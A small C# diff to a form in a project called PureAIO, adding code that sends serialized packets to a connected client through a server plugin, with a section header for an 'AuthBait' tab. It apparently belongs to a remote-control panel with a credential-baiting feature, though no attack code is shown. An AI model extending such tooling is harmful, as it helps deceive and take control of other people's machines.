@@ -1,13 +1,34 @@
 using System;
 using System.Windows.Forms;
+using PluginSDK.Interfaces;
+using PluginSDK.Packets;
 
 namespace PureAIO
 {
     public partial class Form1 : Form
     {
+        private Action<IPacket> _send;
+
         public Form1()
         {
             InitializeComponent();
+        }
+
+        // Called by ServerPlugin when the client connects
+        public void SetSend(Action<IPacket> send) { _send = send; }
+
+        // Called by ServerPlugin on disconnect
+        public void OnDisconnected()
+        {
+            _send = null;
+        }
+
+        // Send a serialized AIOPacket to the connected client
+        private void SendPacket(AIOPacket pkt)
+        {
+            if (_send == null) return;
+            var buf = ServerPlugin.Serialize(pkt);
+            _send(new CustomPacket { Buffer = buf });
         }
 
         // ── AuthBait tab ──────────────────────────────────────────────────────
